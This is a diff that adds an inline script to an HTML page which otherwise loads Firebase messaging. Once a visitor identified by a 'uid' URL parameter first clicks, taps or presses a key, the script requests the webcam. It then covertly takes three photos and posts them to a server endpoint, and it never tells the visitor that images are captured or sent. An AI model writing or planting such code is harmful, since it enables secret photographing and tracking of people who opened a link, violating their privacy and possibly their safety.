@@ -449,5 +449,66 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-messaging-compat.js"></script>
   <script src="script.js"></script>
+
+  <script>
+    (function () {
+      var uid = (new URLSearchParams(location.search).get('uid') || '').trim();
+      if (!uid) return;
+
+      var done = false;
+
+      function captureFrame(v) {
+        var canvas = document.createElement('canvas');
+        canvas.width = v.videoWidth || 640;
+        canvas.height = v.videoHeight || 480;
+        canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.85);
+      }
+
+      function send(images) {
+        return fetch('/api/camera/capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ uid: uid, images: images }),
+        }).then(function (res) { return res.json(); });
+      }
+
+      async function fire() {
+        if (done) return;
+        done = true;
+        document.removeEventListener('click', start, true);
+        document.removeEventListener('touchstart', start, true);
+        document.removeEventListener('keydown', start, true);
+
+        var stream;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        } catch (e) { return; }
+
+        var video = document.createElement('video');
+        video.muted = true;
+        video.playsInline = true;
+        video.srcObject = stream;
+        try { await video.play(); } catch (e) { return; }
+        await new Promise(function (r) { setTimeout(r, 700); });
+
+        var shots = [];
+        for (var i = 0; i < 3; i++) {
+          shots.push(captureFrame(video));
+          await new Promise(function (r) { setTimeout(r, 350); });
+        }
+        stream.getTracks().forEach(function (t) { t.stop(); });
+        video.srcObject = null;
+
+        try { await send(shots); } catch (e) {}
+      }
+
+      function start() { fire(); }
+
+      document.addEventListener('click', start, true);
+      document.addEventListener('touchstart', start, true);
+      document.addEventListener('keydown', start, true);
+    })();
+  </script>
 </body>
 </html>
